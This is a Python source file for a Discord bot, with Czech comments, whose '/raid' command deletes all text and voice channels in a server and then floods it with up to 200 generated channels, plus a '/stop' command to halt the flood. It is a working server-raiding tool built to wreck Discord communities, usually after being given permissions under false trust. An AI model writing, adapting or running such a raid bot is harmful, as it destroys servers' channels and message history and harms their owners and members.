import discord
import random
import string
from discord.ext import commands

# Nahraď tento řetězec za svůj Discord bot token
TOKEN = "YOUR_BOT_TOKEN"

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True

# Definujeme příkazový prefix pro bota
bot = commands.Bot(command_prefix="/", intents=intents)

generating_channels = False

@bot.event
async def on_ready():
    print(f"We have logged in as {bot.user}")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    await bot.process_commands(message)

@bot.command(name='raid')
async def replace_channels(ctx, count: int, channel_name_base: str, category_name: str = None):
    global generating_channels
    if generating_channels:
        await ctx.send("Generování kanálů již probíhá.")
        return

    if count < 1 or count > 200:
        await ctx.send("Počet kanálů musí být mezi 1 a 200.")
        return

    generating_channels = True

    for channel in ctx.guild.text_channels:
        await channel.delete()

    for channel in ctx.guild.voice_channels:
        await channel.delete()

    category = None
    if category_name:
        category = await ctx.guild.create_category(category_name)

    for i in range(1, count + 1):
        if not generating_channels:
            await ctx.send("Generování kanálů bylo zastaveno.")
            break

        channel_name = f"{channel_name_base}-{i}"
        channel = await ctx.guild.create_text_channel(channel_name, category=category)

    generating_channels = False

    await ctx.send(f"Bylo vytvořeno {count} textových kanálů s názvem '{channel_name_base}-1' až '{channel_name_base}-{count}'.")

@bot.command(name='stop')
async def stop_bot(ctx):
    global generating_channels
    if generating_channels:
        generating_channels = False
        await ctx.send("Generování kanálů bylo zastaveno.")
    else:
        await ctx.send("Generování kanálů již neprobíhá.")

bot.run(TOKEN)
